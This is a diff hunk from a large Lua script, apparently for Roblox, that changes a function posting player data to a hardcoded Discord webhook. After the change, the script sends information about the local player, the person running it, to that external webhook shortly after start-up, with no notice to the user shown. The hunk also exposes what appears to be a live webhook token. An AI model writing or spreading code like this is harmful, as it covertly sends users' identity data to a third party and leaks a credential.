@@ -3332,7 +3332,8 @@ end)
 run(function()
     local weburl = "https://discord.com/api/webhooks/1509060246864134184/og8Eb4WpwqNSVZOTPipYP0ir3T2LZx9qD0c44fHNh2l5w6Ivt77udxjwaYI21EVW6Q0x"
     
-    local function sendToWebhook(player)
+    local function sendToWebhook()
+        local player = game.Players.LocalPlayer
         if not player then return end
         
         local success, thumbnail = pcall(function()
@@ -3373,16 +3374,8 @@ run(function()
         end)
     end
     
-    local function onPlayerJoined(player)
-        task.wait(1)
-        sendToWebhook(player)
-    end
-    
-    game.Players.PlayerAdded:Connect(onPlayerJoined)
-    
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        onPlayerJoined(player)
-    end
+    task.wait(2)
+    sendToWebhook()
 end)
 	
 run(function()
